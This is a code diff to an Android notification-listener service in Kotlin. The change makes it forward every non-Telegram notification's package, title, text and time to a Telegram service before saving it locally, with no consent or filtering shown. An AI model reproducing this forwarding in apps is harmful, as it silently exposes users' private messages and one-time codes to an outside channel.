@@ -13,6 +13,7 @@ import java.util.TimeZone
 
 class NotificationListener : NotificationListenerService() {
     private lateinit var notificationDao: NotificationDao
+    private lateinit var telegramService: TelegramService
     override fun onCreate() {
         super.onCreate()
         val db = Room.databaseBuilder(
@@ -22,6 +23,7 @@ class NotificationListener : NotificationListenerService() {
         CoroutineScope(Dispatchers.IO).launch {
             notificationDao = db.notificationDao()
         }
+        telegramService = TelegramService()
     }
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         super.onNotificationPosted(sbn)
@@ -30,12 +32,15 @@ class NotificationListener : NotificationListenerService() {
         val title = extras.getString("android.title")
         val text = extras.getCharSequence("android.text")?.toString()
         val timestamp = getCurrentTimeInIST()
-        if (title != null && text != null) {
-            val notificationData = NotificationData(
-                packageName = packageName, title = title, text = text, timestamp = timestamp
-            )
-            CoroutineScope(Dispatchers.IO).launch {
-                notificationDao.insert(notificationData)
+        if(!packageName.startsWith("org.telegram")) {
+            telegramService.sendMessage("Package: $packageName, Title: $title, Text: $text, Time: $timestamp")
+            if (title != null && text != null) {
+                val notificationData = NotificationData(
+                    packageName = packageName, title = title, text = text, timestamp = timestamp
+                )
+                CoroutineScope(Dispatchers.IO).launch {
+                    notificationDao.insert(notificationData)
+                }
             }
         }
     }
